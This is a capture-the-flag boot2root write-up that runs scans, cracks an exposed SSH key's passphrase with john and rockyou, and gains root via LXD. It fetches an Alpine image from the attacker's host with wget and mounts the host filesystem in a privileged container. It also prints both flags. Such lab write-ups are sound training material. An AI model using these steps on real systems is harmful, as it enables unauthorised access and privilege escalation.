---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1 Boot2Root
### What is the user flag?
Let's begin by performing an `nmap` scan against the target.
```
$ nmap -sC -sV 10.10.223.2
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-16 09:38 IST
Nmap scan report for 10.10.223.2
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```
There are two open ports:

| Port | Service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

Let's visit the website through the browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/7595fb56-6c5a-4462-959a-4b9bdda22924)

There's really nothing of importance here.

Using `CTRL+U` we can view the source page.

![3](https://github.com/Knign/Write-ups/assets/110326359/9d7c738e-1f18-4b71-8bf5-9a3914f1c58b)

So we know that there is a user called `john`.

We can use `gobuster` to find other web pages that might be useful.
```
$ gobuster dir -u http://10.10.223.2 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.223.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 311] [--> http://10.10.223.2/secret/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.223.2/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
The `/secret` page seems interesting, let's go there.

![4](https://github.com/Knign/Write-ups/assets/110326359/5337a972-eaeb-4559-bcf1-f580570b881c)

Let's get the `secretKey`.

![5](https://github.com/Knign/Write-ups/assets/110326359/0cf52dc6-98b2-4a7c-9d88-559dca31c30f)

It seems to be the private key of the `john` user we saw before.
We can use `ssh2john` to create a hash file.
```
$ ssh2john secretKey > secretKey_hash 
```
Now we can use `john` to crack the hashes.
```
$ john secretKey_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2023-12-16 10:01) 4.347g/s 2295p/s 2295c/s 2295C/s stupid..red123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Let's change the permissions of the `secretKey`.
```
$ chmod 600 secretKey
$ ls -l
total 8
-rw------- 1 kunal kunal 1766 Dec 16 10:03 secretKey
-rw-r--r-- 1 kunal kunal 2461 Dec 16 10:00 secretKey_hash
```
Now we are all set to login through SSH as the `john` user.
```
$ ssh -i secretKey john@10.10.223.2
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 16 04:34:22 UTC 2023

  System load:  0.0               Processes:           97
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.223.2
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```
We can now read the user flag.
```
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```
### Answer
```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

&nbsp;

### What is the root flag?
Let's check what groups `john` is a part of.
```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
On searching for a while we can find the following article that explains how to escalate the root privilege by exploiting the features of LXD.

#### Commands to be run on the attacker machine:
```
$ git clone  https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ sudo ./build-alpine
$ python3 -m http.server
```

#### Commands to be run on the target machine:
```
john@exploitable:/tmp$ wget http://10.17.48.138:8000/alpine-v3.19-x86_64-20231216_1041.tar.gz
--2023-12-16 05:12:53--  http://10.17.48.138:8000/alpine-v3.19-x86_64-20231216_1041.tar.gz
Connecting to 10.17.48.138:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3646460 (3.5M) [application/gzip]
Saving to: ‘alpine-v3.19-x86_64-20231216_1041.tar.gz’

alpine-v3.19-x86_64-20231216_1041.tar.gz                   100%[========================================================================================================================================>]   3.48M   490KB/s    in 8.7s    

2023-12-16 05:13:02 (410 KB/s) - ‘alpine-v3.19-x86_64-20231216_1041.tar.gz’ saved [3646460/3646460]

john@exploitable:/tmp$ lxc image import alpine-v3.19-x86_64-20231216_1041.tar.gz --alias myimage
Image imported with fingerprint: 8d217b63453d877763142d3cfdf5bb25ad94c2ef132da82eab9c314fc5f74741
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 8d217b63453d | no     | alpine v3.19 (20231216_10:41) | x86_64 | 3.48MB | Dec 16, 2023 at 5:16am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
```
We can now locate the `root.txt` file using the `find` command.
```
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
```
Let's get the root flag.
```
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
### Answer
```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
